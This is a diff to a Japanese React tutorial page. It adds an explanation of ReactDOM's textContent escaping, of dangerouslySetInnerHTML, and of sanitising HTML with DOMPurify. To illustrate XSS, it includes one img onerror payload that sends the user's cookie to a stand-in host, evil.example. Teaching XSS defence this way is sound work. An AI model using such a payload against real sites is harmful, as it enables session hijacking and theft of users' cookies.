@@ -1,6 +1,6 @@
 ---
-title: 'JSXとコンポーネント — propsで部品をつなぐ'
-description: 'JSXのルール、式の埋め込み、関数コンポーネントとpropsのパターンを、短いコード例でなぞります。'
+title: 'JSXとコンポーネント — 描画の仕組みからpropsまで'
+description: 'JSXのルール、React（ReactDOM）がHTMLをエスケープする仕組み、dangerouslySetInnerHTMLとサニタイズ、props・childrenの基本パターンを整理します。'
 order: 2
 ---
 
@@ -51,6 +51,128 @@ function Welcome({ name }: User) {
   );
 }
 ```
+
+## dangerouslySetInnerHTML — 生HTMLの埋め込み
+
+### なぜ文字列のHTMLタグはそのまま表示されるのか
+
+<Figure src="/images/question_woman_04_color.png" alt="HTMLタグがそのまま表示される疑問" maxWidth="120px" />
+
+HTMLタグを含む文字列を `{}` で埋め込んでも、タグとして解釈されずに文字列がそのまま画面に出ます。
+
+```tsx
+const raw = "<strong>太字</strong>";
+return <p>{raw}</p>;
+// → 画面には「<strong>太字</strong>」という文字列がそのまま表示される
+```
+
+これは**JSXではなくReact（ReactDOM）の仕組み**です。処理の流れを見てみましょう。
+
+まず、JSXはビルド時に `React.createElement` の呼び出しに変換されます。ここではまだエスケープは起きていません。
+
+```tsx
+// JSX
+<p>{raw}</p>
+
+// ↓ ビルド時にこう変換される
+React.createElement("p", null, raw);
+```
+
+エスケープが起きるのは、ReactDOMが仮想DOMを実際のDOMへ反映する段階です。
+文字列の子要素に対して、ReactDOMは `innerHTML` ではなく **`textContent`（テキストノード）** としてDOMに挿入します。
+`textContent` はブラウザが文字列をHTMLとして解釈しないため、タグがそのまま表示される、というわけです。
+
+<MermaidDiagram
+  chart={`
+flowchart LR
+    classDef jsx fill:#8b5cf6,color:#fff,stroke:#7c3aed
+    classDef build fill:#f59e0b,color:#fff,stroke:#d97706
+    classDef react fill:#3b82f6,color:#fff,stroke:#2563eb
+    classDef dom fill:#10b981,color:#fff,stroke:#059669
+
+    A["JSX\n&lt;p&gt;{raw}&lt;/p&gt;"] -->|"ビルド時"| B["React.createElement\n('p', null, raw)"]
+    B -->|"実行時"| C["仮想DOM\nReactツリー"]
+    C -->|"ReactDOM"| D["実DOM\ntextContent で挿入"]
+
+    class A jsx
+    class B build
+    class C react
+    class D dom
+`}
+/>
+
+<Callout type="column" title="安全なデフォルト">
+Reactが `textContent` を使うのは意図的な設計です。もし `innerHTML` がデフォルトだったら、ユーザー入力がそのままHTMLとして解釈され、悪意あるスクリプトが実行される（XSS）危険があります。「デフォルトを安全にし、危険な操作は明示的に書かせる」という方針で、このあとの `dangerouslySetInnerHTML` の名前にもつながっています。
+</Callout>
+
+### 生HTMLを描画したいとき
+
+CMSやMarkdownパーサーから返ってきたHTML文字列をそのまま描画したいときは、`dangerouslySetInnerHTML` を使います。
+ReactDOMはこのpropが指定された要素に対しては `innerHTML` でHTMLを挿入します。
+
+```tsx
+const html = "<strong>太字</strong>";
+return <p dangerouslySetInnerHTML={{ __html: html }} />;
+// → 画面には「太字」と太字で表示される
+```
+
+### サニタイズ — なぜ必要で、何をするのか
+
+<Figure src="/images/harry_man_color.png" alt="XSSの危険に焦るイメージ" maxWidth="120px" />
+
+`dangerouslySetInnerHTML` は `innerHTML` を使うため、渡したHTML文字列がそのままブラウザに解釈されます。
+もしその文字列にユーザーが仕込んだ悪意あるコードが含まれていたら、そのまま実行されてしまいます。
+
+```html
+<!-- ユーザーがコメント欄にこう入力したとする -->
+<img src="x" onerror="document.location='https://evil.example/steal?cookie='+document.cookie" />
+```
+
+これが `innerHTML` 経由でDOMに入ると、ブラウザは `onerror` を実行し、Cookieが外部に送信されます。
+これが**クロスサイトスクリプティング（XSS）** です。
+
+**サニタイズ**とは、HTML文字列から危険な要素・属性を取り除き、安全なHTMLだけを残す処理のことです。
+具体的には `<script>` タグの除去、`onerror` などのイベント属性の除去、`javascript:` スキームのURL除去などを行います。
+
+<MermaidDiagram
+  chart={`
+flowchart LR
+    classDef danger fill:#ef4444,color:#fff,stroke:#b91c1c
+    classDef sanitize fill:#f59e0b,color:#fff,stroke:#d97706
+    classDef safe fill:#10b981,color:#fff,stroke:#059669
+    classDef dom fill:#3b82f6,color:#fff,stroke:#2563eb
+
+    A["信頼できないHTML\n&lt;p&gt;本文&lt;/p&gt;\n&lt;script&gt;alert(...)&lt;/script&gt;"] -->|"DOMPurify等"| B["サニタイズ\n危険な要素を除去"]
+    B --> C["安全なHTML\n&lt;p&gt;本文&lt;/p&gt;"]
+    C -->|"dangerouslySetInnerHTML"| D["DOM\ninnerHTMLで挿入"]
+
+    class A danger
+    class B sanitize
+    class C safe
+    class D dom
+`}
+/>
+
+```tsx
+import DOMPurify from "dompurify";
+
+const dirty = '<p>本文</p><script>alert("XSS")</script>';
+const clean = DOMPurify.sanitize(dirty);
+// → '<p>本文</p>'（scriptタグが除去される）
+
+return <div dangerouslySetInnerHTML={{ __html: clean }} />;
+```
+
+<Callout type="warning" title="サニタイズの判断基準">
+HTMLの出所によって対応が変わります。
+
+- **自分が管理するCMS・ビルド時に生成したHTML** — 入力経路が限定されているため、サニタイズなしでも許容できる場合が多い
+- **ユーザー入力を含むHTML（コメント、プロフィールなど）** — 必ずサニタイズが必要。DOMPurifyなどのライブラリを使う
+- **外部APIから取得したHTML** — 信頼度に応じて判断。迷ったらサニタイズする
+</Callout>
+
+実務では、Next.jsでのCMS連携やMDXコンテンツの表示など、フレームワーク側の機能と組み合わせて使うケースが中心です。
+詳しくは「[Next.jsからはじめよう](/books/next-js)」で扱います。
 
 ## propsで部品を再利用する
 
